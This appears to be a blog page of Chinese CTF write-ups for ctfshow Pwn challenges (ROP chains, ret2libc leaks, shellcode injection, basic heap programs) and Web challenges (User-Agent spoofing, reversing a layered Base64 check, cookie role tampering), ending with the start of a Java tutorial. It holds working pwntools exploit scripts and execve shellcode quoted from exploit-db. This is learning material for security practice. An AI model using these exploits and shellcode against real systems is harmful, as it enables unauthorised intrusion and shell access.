123456789int __fastcall main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); logo(); ctfshow(); puts(&quot;\\nExit&quot;); return 0;&#125; 123456ssize_t ctfshow()&#123; _BYTE buf[10]; // [rsp+6h] [rbp-Ah] BYREF return read(0, buf, 0x32u);&#125; 首先可以在IDA的Imports页面看到system函数，也就是题目里说的有system()： 而在Imports页面里可以发现一个useful函数： 1234int useful()&#123; return printf(&quot;sh&quot;);&#125; 我们刚好可以利用这个”sh”来代替”/bin/sh”，将其传递给system()。 最后再确认一下Stack结构以及偏移： Exploit： 12345678910111213141516171819202122from pwn import *r = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28311)elf = ELF(&#x27;./pwn&#x27;,checksec = &quot;False&quot;)system = p64(elf.sym[&#x27;system&#x27;])pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))sh = p64(next(elf.search(b&#x27;sh&#x27;)))ret = p64(next(elf.search(asm(&#x27;ret&#x27;, arch=&#x27;amd64&#x27;))))payload = b&quot;A&quot;*18 + pop_rdi + sh + ret + systemr.sendline(payload)r.recv()r.sendline(b&#x27;cat ctfshow_flag&#x27;)r.interactive()# ctfshow&#123;f73de357-2080-4c01-9167-464f37a3e682&#125; Ret2libcPwn46 123456789int __fastcall main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); logo(); puts(&quot;O.o?&quot;); ctfshow(); write(0, &quot;Hello CTFshow!\\n&quot;, 0xEu); return 0;&#125; 123456ssize_t ctfshow()&#123; _BYTE buf[112]; // [rsp+0h] [rbp-70h] BYREF return read(0, buf, 0xC8u);&#125; 漏洞依旧是read函数导致的Buffer Overflow。 现在我们虽然没有直接的system函数和&quot;/bin/sh&quot;。但是system函数是属于libc的，而libc.so动态链接库中的函数之间的相对偏移是固定的。 而假如我们可以得知libc中某个函数的地址，那么我们就可以根据该程序利用的libc来计算出system函数的地址。并且libc中其实也有&quot;/bin/sh&quot;字符串的。所以都可以获得。 那么该怎样完成第一步呢？我们可以用这里的write()函数。 思路如下： 泄露write函数地址： 先来看一下write函数的语法： 1ssize_t write(int fd, const void *buf, size_t count); 含义与参数 fd：文件描述符。常见 0=stdin，1=stdout，2=stderr；也可以是普通文件、管道、socket 等。 buf：待写出的内存起始地址。 count：希望写出的字节数。 所以我们希望这样调用write函数： 1write@plt(fd=1, buf=&amp;write@got, count=rdx) write@plt：是代码段里的跳板（stub）地址，一小段可执行指令。需要通过调用它（把 RIP 跳过去）来间接调用真正的 libc::write。 &amp;write@got：是数据段里 GOT 表项的内存地址（8 字节）。这个表项里存放着真正的函数地址（解析后就是 libc 中 write 的真实指针）。可以把它当数据指针用，比如 write(1, &amp;write@got, 8) 就能把那 8 字节“指针值”打印出来。 按 SysV x64 ABI，函数前三个参数放在 rdi, rsi, rdx。 利用pop_rdi + p64(1)来设置第一个参数； 再利用pop_rsi_r15 + write_got + p64(0)设置第二个参数； 最后再ret到write@plt； 我们没有 pop rdx gadget，但前面刚调用过 read(0, buf, 0xC8)。所以在我们接管返回地址时，寄存器 rdx 仍保留为 0xC8。 等write执行完了我们再将返回地址修改成main，让整个程序再跑一遍，用于注入执行system(&#39;/bin/sh&#39;)。 获取libc版本 利用python的LibcSearcher库： 1234write = u64(r.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;write&#x27;,write)libc_base = write - libc.dump(&#x27;write&#x27;) 获取system函数与&quot;/bin/sh&quot;的地址 12system = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;) 再次执行程序 触发栈溢出执行system(&#39;/bin/sh&#39;) 可以使用GDB查找gadgets的地址： Exploit： 123456789101112131415161718192021222324252627282930313233343536from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)r = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28258)elf = ELF(&#x27;./pwn&#x27;)write_plt = p64(elf.plt[&#x27;write&#x27;])write_got = p64(elf.got[&#x27;write&#x27;])main = p64(elf.sym[&#x27;main&#x27;])# pop_rdi = p64(0x400803)pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))pop_rsi_r15 = p64(0x400801) # pop rsi ; pop r15 ; retpayload = b&quot;A&quot;*(0x70+8)payload += pop_rdi + p64(1) # rdi = 1 (stdout)payload += pop_rsi_r15 + write_got + p64(0) # rsi = &amp;write@got, r15 占位payload += write_plt # ret 到 write@pltpayload += main # write 返回后再回 mainr.sendlineafter(b&quot;O.o?&quot;,payload)write = u64(r.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(write))libc = LibcSearcher(&#x27;write&#x27;,write)libc_base = write - libc.dump(&#x27;write&#x27;)system = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&quot;A&quot;*(0x70+8) + pop_rdi + p64(bin_sh) + p64(system)r.sendlineafter(b&quot;O.o?&quot;,payload)r.interactive() Pwntools的shellcodePwntools的shellcode的字节长度如下： 12345678910from pwn import *# context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)# shellcode_32 = asm(shellcraft.sh())# print(len(shellcode_32)) # 44context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)shellcode_64 = asm(shellcraft.sh())print(len(shellcode_64)) # 48 Pwn56 12345678└─$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn56/pwn&#x27; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) Stripped: No 1234567891011121314public startstart proc nearpush 68h ; &#x27;h&#x27;push 732F2F2Fhpush 6E69622Fhmov ebx, esp ; filexor ecx, ecx ; argvxor edx, edx ; envppush 0Bhpop eaxint 80h ; LINUX - sys_execvestart endp_text ends 这段代码是x86汇编语言的代码，用于在Linux系统上执行execve(“/bin//sh”, NULL, NULL)。 所以我们一连接到服务器就会直接拿到Shell： 123└─$ nc pwn.challenge.ctf.show 28214cat ctfshow_flagctfshow&#123;7b0cc826-a180-4ce8-a26c-a4531b634162&#125; Pwn57 123456789└─$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn57/pwn&#x27; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable Stripped: No （注意到这个程度的Stack是Executable的。） 1234567891011121314151617public _start_start proc nearpush raxxor rdx, rdxxor rsi, rsimov rbx, 68732F2F6E69622Fhpush rbxpush rsppop rdimov al, 3Bh ; &#x27;;&#x27;syscall ; LINUX -_start endp_text endsend _start 这段代码是x86-64汇编语言的代码，用于在Linux系统上执行execve(“/bin//sh”, NULL, NULL)。 push rax 把 RAX 压栈，意图是给后面的字符串做一个 8 字节的 \\0 终止符。 xor rdx, rdx RDX = 0，作为 envp = NULL。 xor rsi, rsi RSI = 0，作为 argv = NULL（Linux 内核允许 argv 为 NULL，等价于空参数列表）。 mov rbx, 68732F2F6E69622Fh 把常量装入 RBX。按小端序，这 8 字节在内存中是字符串 &quot;/bin//sh&quot;。 push rbx 把 &quot;/bin//sh&quot; 压到栈上；若前面的 push rax 是 0，这里就得到以 NUL 结尾的字符串。 push rsp / pop rdi 把当前 RSP（也就是刚压入的字符串地址）放到 RDI。RDI 将作为 filename 参数。 mov al, 3Bh AL = 0x3B（十进制 59），x86-64 Linux 上 execve 的系统调用号。 syscall 触发系统调用：execve(rdi=&quot;/bin//sh&quot;, rsi=NULL, rdx=NULL)。成功的话当前进程映像被 /bin//sh 替换，进入交互 shell；失败则返回带 errno 的负值到 RAX。 所以我们一连接到服务器就会直接拿到Shell： 123└─$ nc pwn.challenge.ctf.show 28291cat ctfshow_flagctfshow&#123;048529da-d481-45f2-9a88-7b900ccd1dbb&#125; Pwn5912345678910└─$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn59/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments Stripped: No 12345678910111213141516171819202122232425262728293031323334353637; int __fastcall main(int argc, const char **argv, const char **envp)public mainmain proc nearvar_B0= qword ptr -0B0hvar_A4= dword ptr -0A4hvar_A0= byte ptr -0A0h; __unwind &#123;push rbpmov rbp, rspsub rsp, 0B0hmov [rbp+var_A4], edimov [rbp+var_B0], rsimov rax, cs:__bss_startmov ecx, 0 ; nmov edx, 2 ; modesmov esi, 0 ; bufmov rdi, rax ; streamcall _setvbufmov eax, 0call logolea rdi, aJustVeryEasyRe ; &quot;Just very easy ret2shellcode&amp;&amp;64bit&quot;call _putslea rdi, aAttachIt ; &quot;Attach it!&quot;call _putslea rax, [rbp+var_A0]mov rdi, raxcall ctfshowlea rdx, [rbp+var_A0]mov eax, 0call rdxmov eax, 0leaveretn; &#125; // starts at 400686main endp 不知道IDA为什么没法反汇编这段。 简单解释一下这个程序： 关闭/调整缓冲 -&gt; 打印横幅 -&gt; 为局部缓冲区调用 ctfshow（把数据/用户输入放到缓冲区）-&gt; 然后把这个缓冲区当作代码执行（call buffer） -&gt; 返回 0。 所以说我们直接发送一段shellcode就好了。 可以利用Pwntools里的shellcode函数高效实现： 12345678910111213141516171819202122232425262728293031from pwn import *context(arch = &quot;amd64&quot;, os = &quot;linux&quot;)r = remote(&quot;pwn.challenge.ctf.show&quot;, 28112)shellcode = asm(shellcraft.sh())r.sendline(shellcode)r.interactive()# └─$ python exp.py # [+] Opening connection to pwn.challenge.ctf.show on port 28112: Done# [*] Switching to interactive mode# ▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄ # ██▀▀▀▀█ ▀▀▀██▀▀▀ ██▀▀▀▀▀▀ ██ # ██▀ ██ ██ ▄▄█████▄ ██▄████▄ ▄████▄ ██ ██# ██ ██ ███████ ██▄▄▄▄ ▀ ██▀ ██ ██▀ ▀██ ▀█ ██ █▀# ██▄ ██ ██ ▀▀▀▀██▄ ██ ██ ██ ██ ██▄██▄██ # ██▄▄▄▄█ ██ ██ █▄▄▄▄▄██ ██ ██ ▀██▄▄██▀ ▀██ ██▀ # ▀▀▀▀ ▀▀ ▀▀ ▀▀▀▀▀▀ ▀▀ ▀▀ ▀▀▀▀ ▀▀ ▀▀ # * ************************************* # * Classify: CTFshow --- PWN --- 入门 # * Type : Stack_Overflow # * Site : https://ctf.show/ # * Hint : Use shellcode to get shell! # * ************************************* # Just very easy ret2shellcode&amp;&amp;64bit# Attach it!# jhH\\xb8/bin///sPH\\x89\\xe7hri\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05# $ cat ctfshow_flag# ctfshow&#123;735fe74b-4c01-478c-bd38-803c64c7294f&#125;# $ # [*] Interrupted# [*] Closed connection to pwn.challenge.ctf.show port 28112 注意，其中这行代码非常重要： 1context(arch = &quot;amd64&quot;, os = &quot;linux&quot;) 它这行告诉pwntools目标的CPU架构和操作系统（即寄存器/系统调用约定），决定 shellcraft.sh() 和 asm() 生成什么样的机器码。 或者（在这道题里我们可以）直接发送cat flag的命令：12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)r = remote(&quot;pwn.challenge.ctf.show&quot;, 28112)# 方法 A：直接 execve /bin/catsc = asm(shellcraft.execve(&quot;/bin/cat&quot;, [&quot;cat&quot;, &quot;ctfshow_flag&quot;]))r.sendline(sc)# 或者方法 B：通过 sh -c（更通用，适合复杂命令）# sc = asm(shellcraft.execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;cat ctfshow_flag&quot;]))# r.sendline(sc)r.interactive()# └─$ python exp.py # [+] Opening connection to pwn.challenge.ctf.show on port 28112: Done# [*] Switching to interactive mode# ▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄ # ██▀▀▀▀█ ▀▀▀██▀▀▀ ██▀▀▀▀▀▀ ██ # ██▀ ██ ██ ▄▄█████▄ ██▄████▄ ▄████▄ ██ ██# ██ ██ ███████ ██▄▄▄▄ ▀ ██▀ ██ ██▀ ▀██ ▀█ ██ █▀# ██▄ ██ ██ ▀▀▀▀██▄ ██ ██ ██ ██ ██▄██▄██ # ██▄▄▄▄█ ██ ██ █▄▄▄▄▄██ ██ ██ ▀██▄▄██▀ ▀██ ██▀ # ▀▀▀▀ ▀▀ ▀▀ ▀▀▀▀▀▀ ▀▀ ▀▀ ▀▀▀▀ ▀▀ ▀▀ # * ************************************* # * Classify: CTFshow --- PWN --- 入门 # * Type : Stack_Overflow # * Site : https://ctf.show/ # * Hint : Use shellcode to get shell! # * ************************************* # Just very easy ret2shellcode&amp;&amp;64bit# Attach it!# H\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01PH\\xb8.cho.ri\\x01H1\\x04$H\\x89\\xe7H\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01PH\\xb8v^gm`f\\x01\\x01H1\\x04$H\\xb8t ctfshoPH\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01PH\\xb8ri\\x01,b\\x01b`H1\\x04$1\\xf6Vj\\x0e^H\\x01\\xe6Vj\\x13^H\\x01\\xe6Vj\\x18^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05$ # ctfshow&#123;735fe74b-4c01-478c-bd38-803c64c7294f&#125;# [*] Got EOF while reading in interactive# $ # [*] Interrupted# [*] Closed connection to pwn.challenge.ctf.show port 28112 Pwn60 1234567891011└─$ checksec pwn60[*] &#x27;/home/archer/ctf-kali/pwn/pwn60/pwn60&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments Stripped: No Debuginfo: Yes 12345678910111213141516171819202122232425262728293031323334353637383940414243; int __cdecl main(int argc, const char **argv, const char **envp)public mainmain proc nears= byte ptr -64hargc= dword ptr 8argv= dword ptr 0Chenvp= dword ptr 10h; __unwind &#123;push ebpmov ebp, espand esp, 0FFFFFFF0hadd esp, 0FFFFFF80hmov eax, ds:stdout@@GLIBC_2_0mov dword ptr [esp+0Ch], 0 ; nmov dword ptr [esp+8], 2 ; modesmov dword ptr [esp+4], 0 ; bufmov [esp], eax ; streamcall _setvbufmov eax, ds:stdin@@GLIBC_2_0mov dword ptr [esp+0Ch], 0 ; nmov dword ptr [esp+8], 1 ; modesmov dword ptr [esp+4], 0 ; bufmov [esp], eax ; streamcall _setvbufmov dword ptr [esp], offset s ; &quot;CTFshow-pwn can u pwn me here!!&quot;call _putslea eax, [esp+80h+s]mov [esp], eax ; scall _getsmov dword ptr [esp+8], 64h ; &#x27;d&#x27; ; nlea eax, [esp+80h+s]mov [esp+4], eax ; srcmov dword ptr [esp], offset buf2 ; destcall _strncpymov dword ptr [esp], offset format ; &quot;See you ~&quot;call _printfmov eax, 0leaveretn; &#125; // starts at 804852Dmain endp 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[100]; // [esp+1Ch] [ebp-64h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;CTFshow-pwn can u pwn me here!!&quot;); gets(s); strncpy(buf2, s, 0x64u); printf(&quot;See you ~&quot;); return 0;&#125; 发现常见漏洞函数gets()。 下面还使用strncpy将s的内容复制给了buf2。 通过gdb/pwndbg可以发现bss段有可执行权限。 所以先将shellcode写入到bss段，然后修改返回地址执行它。 12345678910111213from pwn import *context(arch = &#x27;i386&#x27;,os = &quot;linux&quot;)r = remote(&quot;pwn.challenge.ctf.show&quot;, 28288)buf2_addr = 0x804a080shellcode = asm(shellcraft.sh())payload = shellcode.ljust(112,b&quot;a&quot;) + p32(buf2_addr)r.sendline(payload)r.sendline(&quot;cat ctfshow_flag&quot;)r.interactive()# CTFshow-pwn can u pwn me here!!# See you ~ctfshow&#123;a5013d09-31f7-43a1-b2f0-e5b3161ac2e5&#125; （还没有完全搞懂为什么偏移是112。理论上可以用gdb测试出来。） shellcode.ljust(112,b&quot;a&quot;)：ljust函数会将shellcode字符串填充到长度为112的字符串中，并用&quot;a&quot;填充空余的部分。 Pwn6224位的shellcode（来源：https://www.exploit-db.com/exploits/43550 ）： 1234567891011121314151617181920212223242526272829/*global _startsection .text_start: push 59 pop rax cdq push rdx mov rbx,0x68732f6e69622f2f push rbx push rsp pop rdi push rdx push rdi push rsp pop rsi syscall*/#include &lt;stdio.h&gt;#include &lt;string.h&gt;char code[] = &quot;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05&quot;;// char code[] = &quot;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&quot;;int main()&#123; printf(&quot;len:%d bytes\\n&quot;, strlen(code)); (*(void(*)()) code)(); return 0;&#125; Pwn6323位的shellcode（来源：https://www.exploit-db.com/exploits/36858 ）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/* # # Execve /bin/sh Shellcode Via Push (Linux x86_64 23 bytes) # # Dying to be the shortest. # # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com) # # 27 April 2015 # # GPL # .global _start_start: # char *const argv[] xorl %esi, %esi # &#x27;h&#x27; &#x27;s&#x27; &#x27;/&#x27; &#x27;/&#x27; &#x27;n&#x27; &#x27;i&#x27; &#x27;b&#x27; &#x27;/&#x27; movq $0x68732f2f6e69622f, %rbx # for &#x27;\\x00&#x27; pushq %rsi pushq %rbx pushq %rsp # const char *filename popq %rdi # __NR_execve 59 pushq $59 popq %rax # char *const envp[] xorl %edx, %edx syscall *//* gcc -z execstack push64.c uname -r 3.19.3-3-ARCH */#include &lt;stdio.h&gt;#include &lt;string.h&gt;intmain(void)&#123; char *shellcode = &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56&quot; &quot;\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;; printf(&quot;strlen(shellcode)=%d\\n&quot;, strlen(shellcode)); ((void (*)(void))shellcode)(); return 0;&#125; 堆利用-前置基础Pwn135 来看一下程序： 12345678int __fastcall main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); logo(); menu(); ctfshow(); return 0;&#125; 12345678910111213141516int logo()&#123; puts(s); puts(asc_D40); puts(asc_DC0); puts(asc_E50); puts(asc_EE0); puts(asc_F68); puts(asc_1000); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : Heap_Exploitation &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : Learn how to allocate heap ! &quot;); return puts(&quot; * ************************************* &quot;);&#125; 12345678int menu()&#123; puts(&quot;Choose a function to allocate heap memory:&quot;); puts(&quot;1. malloc&quot;); puts(&quot;2. calloc&quot;); puts(&quot;3. realloc&quot;); return printf(&quot;Enter your choice: &quot;);&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849unsigned __int64 ctfshow()&#123; int v1; // [rsp+4h] [rbp-1Ch] BYREF size_t size; // [rsp+8h] [rbp-18h] BYREF void *ptr; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); ptr = 0; __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 == 2 ) &#123; printf(&quot;Enter the size to allocate using calloc: &quot;); __isoc99_scanf(&quot;%lu&quot;, &amp;size); ptr = calloc(1u, size); &#125; else if ( v1 &gt; 2 ) &#123; if ( v1 != 3 ) &#123; if ( v1 == 4 ) &#123; printf(&quot;Here is you want: &quot;); system(&quot;cat /ctfshow_flag&quot;); &#125; goto LABEL_12; &#125; printf(&quot;Enter the size to allocate using realloc: &quot;); __isoc99_scanf(&quot;%lu&quot;, &amp;size); ptr = realloc(ptr, size); &#125; else &#123; if ( v1 != 1 ) &#123;LABEL_12: puts(&quot;Invalid choice.&quot;); return __readfsqword(0x28u) ^ v4; &#125; printf(&quot;Enter the size to allocate using malloc: &quot;); __isoc99_scanf(&quot;%lu&quot;, &amp;size); ptr = malloc(size); &#125; if ( ptr ) printf(&quot;Memory allocated at address: %p\\n&quot;, ptr); else puts(&quot;Memory allocation failed.&quot;); return __readfsqword(0x28u) ^ v4;&#125; 这个程序主要演示了标准库堆内存分配，分别调用 malloc/calloc/realloc 申请指定大小的内存并打印返回指针，包含分配失败与非法选项处理。 正常情况： 错误情况： 但还没搞懂开了PIE的程序该怎么调试： FLAG不难注意到： 1234if ( v1 == 4 ) &#123; printf(&quot;Here is you want: &quot;); system(&quot;cat /ctfshow_flag&quot;); 所以发送4即可获取flag。 pwn136 12345678int __fastcall main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); logo(); menu(); ctfshow(); return 0;&#125; 12345678910111213141516int logo()&#123; puts(s); puts(asc_D80); puts(asc_E00); puts(asc_E90); puts(asc_F20); puts(asc_FA8); puts(asc_1040); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : Heap_Exploitation &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : Learn how to free heap ! &quot;); return puts(&quot; * ************************************* &quot;);&#125; 12345678int menu()&#123; puts(&quot;Choose a pointer to free:&quot;); puts(&quot;1. ptr_malloc&quot;); puts(&quot;2. ptr_calloc&quot;); puts(&quot;3. ptr_realloc&quot;); return printf(&quot;Enter your choice: &quot;);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566unsigned __int64 ctfshow()&#123; int v1; // [rsp+Ch] [rbp-24h] BYREF void *ptr; // [rsp+10h] [rbp-20h] void *v3; // [rsp+18h] [rbp-18h] void *v4; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = 0; v4 = 0; ptr = malloc(4u); if ( ptr ) &#123; v3 = calloc(1u, 4u); if ( v3 ) &#123; v4 = realloc(0, 4u); if ( v4 ) &#123; __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 == 2 ) &#123; free(v3); puts(&quot;ptr_calloc freed.&quot;); return __readfsqword(0x28u) ^ v5; &#125; if ( v1 &gt; 2 ) &#123; if ( v1 == 3 ) &#123; free(v4); puts(&quot;ptr_realloc freed.&quot;); return __readfsqword(0x28u) ^ v5; &#125; if ( v1 == 4 ) &#123; printf(&quot;Here is you want: &quot;); system(&quot;cat /ctfshow_flag&quot;); &#125; &#125; else if ( v1 == 1 ) &#123; free(ptr); puts(&quot;ptr_malloc freed.&quot;); return __readfsqword(0x28u) ^ v5; &#125; puts(&quot;Invalid choice.&quot;); return __readfsqword(0x28u) ^ v5; &#125; puts(&quot;Memory allocation failed for ptr_realloc.&quot;); free(ptr); free(v3); &#125; else &#123; puts(&quot;Memory allocation failed for ptr_calloc.&quot;); free(ptr); &#125; &#125; else &#123; puts(&quot;Memory allocation failed for ptr_malloc.&quot;); &#125; return __readfsqword(0x28u) ^ v5;&#125; FLAG输入4即可。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://archer-baiyi.github.io/en/tags/ctfshow/"}]},{"title":"ctfshow Web应用安全与防护 Writeup","slug":"CTF/Web/ctfshow-Web应用安全与防护-Writeup","date":"2025-09-21T09:15:47.000Z","updated":"2025-09-21T10:01:27.699Z","comments":true,"path":"2025/09/21/CTF/Web/ctfshow-Web应用安全与防护-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/09/21/CTF/Web/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4-Writeup/","excerpt":"","text":"这个板块算是Web的入门板块，考点都比较基础。 第一章Base64编码隐藏 按F12查看网页前端信息： 不难发现这里有Base64编码的内容： 1const correctPassword = &quot;Q1RGe2Vhc3lfYmFzZTY0fQ==&quot;; Base64解码得到密码（同样也是flag）： 1CTF&#123;easy_base64&#125; HTTP头注入尝试用第一题的密码登录，提示： 用这段代码访问网页并修改HTTP头： 1234567891011121314151617181920import requestsurl = &quot;http://85707809-d992-463a-8302-27b63c874e9e.challenge.ctf.show/check.php&quot;data = &#123; &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;CTF&#123;easy_base64&#125;&quot;,&#125;headers = &#123; &quot;User-Agent&quot;: &quot;ctf-show-brower&quot;,&#125;with requests.Session() as s: s.headers.update(headers) r = s.post(url, data=data, timeout=10, allow_redirects=True) print(&quot;Status:&quot;, r.status_code) print(r.text) 即可得到flag： 1CTF&#123;user_agent_inject_success&#125; Base64多层嵌套解码和第一题类似，可以发现这段内容： 12345678910111213141516171819202122document.getElementById(&#x27;loginForm&#x27;).addEventListener(&#x27;submit&#x27;, function(e) &#123; const correctPassword = &quot;SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=&quot;; function validatePassword(input) &#123; let encoded = btoa(input); encoded = btoa(encoded + &#x27;xH7jK&#x27;).slice(3); encoded = btoa(encoded.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;)); encoded = btoa(&#x27;aB3&#x27; + encoded + &#x27;qW9&#x27;).substr(2); return btoa(encoded) === correctPassword; &#125; const enteredPassword = document.getElementById(&#x27;password&#x27;).value; const messageElement = document.getElementById(&#x27;message&#x27;); if (!validatePassword(enteredPassword)) &#123; e.preventDefault(); messageElement.textContent = &quot;Login failed! Incorrect password.&quot;; messageElement.className = &quot;message error&quot;; &#125;&#125;); 用下面这段代码计算出一个可以通过这个检测的密码： 1234567891011121314151617181920212223242526272829303132333435363738394041import base64, stringCORRECT = &quot;SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=&quot;B64CH = string.ascii_letters + string.digitsdef find(): s4 = base64.b64decode(CORRECT, validate=True).decode(&quot;ascii&quot;) for a in B64CH: for b in B64CH: try: blob = base64.b64decode(a + b + s4, validate=True) except Exception: continue if not (blob.startswith(b&quot;aB3&quot;) and blob.endswith(b&quot;qW9&quot;)): continue s3 = blob[3:-3] try: s2 = base64.b64decode(s3.decode(&quot;ascii&quot;), validate=True)[::-1] except Exception: continue for x in B64CH: for y in B64CH: for z in B64CH: try: blob2 = base64.b64decode((x + y + z).encode() + s2, validate=True) except Exception: continue if not blob2.endswith(b&quot;xH7jK&quot;): continue s1 = blob2[:-5] try: pwd = base64.b64decode(s1, validate=True).decode(&quot;utf-8&quot;) except Exception: continue if all(ch in string.ascii_letters + string.digits for ch in pwd): return pwdif __name__ == &quot;__main__&quot;: print(find())# 7A7316 然后使用这段代码访问网页： 1234567891011121314151617181920import requestsurl = &quot;http://36e2e54a-7a81-41a7-86b1-90d6115c142c.challenge.ctf.show/check.php&quot;data = &#123; &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;7A7316&quot;,&#125;headers = &#123; &quot;User-Agent&quot;: &quot;ctf-show-brower&quot;,&#125;with requests.Session() as s: s.headers.update(headers) r = s.post(url, data=data, timeout=10, allow_redirects=True) print(&quot;Status:&quot;, r.status_code) print(r.text) 得到flag： 1CTF&#123;base64_brute_force_success&#125; HTTPS中间人攻击Cookie伪造 通过猜测/爆破得到密码为guest，并登录： 将role的值修改为admin然后刷新页面即可得到flag： 1CTF&#123;cookie_injection_is_fun&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/en/tags/Writeup/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://archer-baiyi.github.io/en/tags/ctfshow/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/en/tags/Web/"}]},{"title":"Java入门","slug":"编程/Java入门","date":"2025-08-29T05:45:26.000Z","updated":"2026-02-09T09:42:29.351Z","comments":true,"path":"2025/08/29/编程/Java入门/","permalink":"https://archer-baiyi.github.io/en/2025/08/29/%E7%BC%96%E7%A8%8B/Java%E5%85%A5%E9%97%A8/","excerpt":"","text":"介绍Java是一种广泛使用的计算机编程语言，拥有跨平台、面向对象、泛型编程的特性，广泛应用于企业级Web应用开发和移动应用开发。 Hello World12345public class HelloWorld &#123; public static void main(String[] args) &#123; System.out.println(&quot;Hello, World!&quot;); &#125;&#125; public class HelloWorld：定义了一个类，类名必须和文件名一致（区分大小写），所以这份文件必须取名为HelloWorld.java。 public static void main(String[] args)：这是 Java 